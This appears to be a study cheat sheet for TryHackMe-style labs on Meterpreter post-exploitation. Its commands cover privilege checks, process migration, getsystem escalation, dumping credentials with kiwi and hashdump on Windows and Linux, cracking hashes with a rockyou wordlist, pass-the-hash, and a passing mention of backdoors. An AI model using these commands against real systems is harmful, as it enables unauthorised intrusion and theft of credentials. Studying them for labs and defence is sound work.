# Meterpreter exploitation commands

[Go back](../metasploit.md#meterpreter)


<div class="row row-cols-md-2"><div>

* ➡️ See if you are root and your privileges

```shell!
meterpreter> getuid
Windows: NT AUTHORITY\SYSTEM
```

* ➡️ Learn more about the system. Here with Windows, you could look for CVEs given the build version. The architecture can help too, as some scripts are less useful on some architectures.

```shell!
meterpreter> sysinfo
Computer        : XXX-PC
OS              : Windows X (... Build xxx...).
Architecture    : x64
```

* ➡️ Start a shell: `sh/bash` on Linux, `cmd` on Windows

```shell!
meterpreter> shell # start a shell
C:\WINDOWS\system32> # Windows cmd
```
</div><div>

* ➡️ Ask for suggested exploits

```shell!
meterpreter> run post/multi/recon/local_exploit_suggester
```

* ➡️ Load a local file `commands.txt` with meterpreter commands

```shell!
meterpreter> resource commands.txt
```

* ➡️ 📝 Migrate to another process 📝. This is something as some services/stuff need us to be "in" a process that has the same architecture, and the same permissions, that our target. **Usually**, any process run by "NT AUTHORITY\SYSTEM"/root should be okay, although you may have to try a few times.

```shell!
meterpreter> ps # list process
meterpreter> migrate process_pid # move to another process
meterpreter> migrate -N process_name # same
meterpreter> # most used ones
meterpreter> migrate -N spoolsv.exe # can restart so good
meterpreter> migrate -N explorer.exe # screenshots...
```
</div></div>

<hr class="sep-both">

## Windows commands

[![blue](../../../../_badges/thm-p/blue.svg)](https://tryhackme.com/room/blue)
[![ice](../../../../_badges/thm-p/ice.svg)](https://tryhackme.com/room/ice)
[![blaster](../../../../_badges/thm-p/blaster.svg)](https://tryhackme.com/room/blaster)
[![steelmountain](../../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)

<div class="row row-cols-md-2 mt-3"><div>

* ➡️ See your privileges

```shell!
meterpreter> getprivs
```

* ➡️ Try automatic privilege escalation 😎 ([more information](https://www.offensive-security.com/metasploit-unleashed/privilege-escalation/)).

```shell!
meterpreter> getsystem
```

* ➡️ Load PowerShell

```shell!
meterpreter> load powershell
meterpreter> powershell_shell
PS>
```
</div><div>

* ➡️ Dump in-memory passwords

```shell!
meterpreter> load kiwi
meterpreter> migrate some_process_nt_system_compatible
meterpreter> creds_all # retrieve all credentials
meterpreter> # you can also create a backdoor...
```

* ➡ | ️`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```ps
meterpreter> hashdump
# You may try to crack them using john within the msfconsole
msf6 exploit('module_used')> use auxiliary/analyze/crack_windows
msf6 exploit('module_used')> set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
msf6 exploit('module_used')> run
```
</div></div>

<hr class="sep-both">

## Linux commands

<div class="row row-cols-md-2 mt-3"><div>

* ➡️ Start a shell

```ps
meterpreter> shell
$
```
</div><div>

* ➡ | ️`root`. Dump every credential stored by the system. Passwords must be [cracked/dehashed](/cybersecurity/cryptography/algorithms/hashing/index.md#hash-cracking). You can use a [hash to login](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/).

```ps
# basically, all that to do: "cat /etc/shadow"
meterpreter> bg
msf6 exploit('module_used')> use post/linux/gather/hashdump
msf6 exploit('module_used')> set SESSION 1
msf6 exploit('module_used')> run
```
</div></div>